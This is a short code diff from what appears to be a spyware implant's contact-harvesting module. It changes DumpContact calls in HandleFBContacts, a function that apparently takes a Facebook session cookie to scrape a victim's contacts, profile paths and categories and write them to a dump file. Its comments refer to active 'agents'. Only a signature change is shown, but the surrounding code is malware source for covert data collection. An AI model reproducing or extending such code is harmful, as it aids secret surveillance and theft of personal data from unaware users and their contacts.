@@ -22,7 +22,7 @@
 extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
 extern BOOL bPM_ContactsStarted; 
 
-extern BOOL DumpContact(HANDLE hfile, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page);
+extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
 extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
 
 typedef struct {
@@ -451,7 +451,7 @@ DWORD HandleFBContacts(char *cookie)
 		profile_w = UTF8_2_UTF16(profile_path);
 		category_w = UTF8_2_UTF16(category);
 
-		DumpContact(hfile, name_w, NULL, NULL, category_w, NULL, NULL, NULL, NULL, NULL, profile_w);
+		DumpContact(hfile, CONTACT_SRC_FACEBOOK, name_w, NULL, NULL, category_w, NULL, NULL, NULL, NULL, NULL, profile_w, 0);
 		
 		SAFE_FREE(name_w);
 		SAFE_FREE(profile_w);
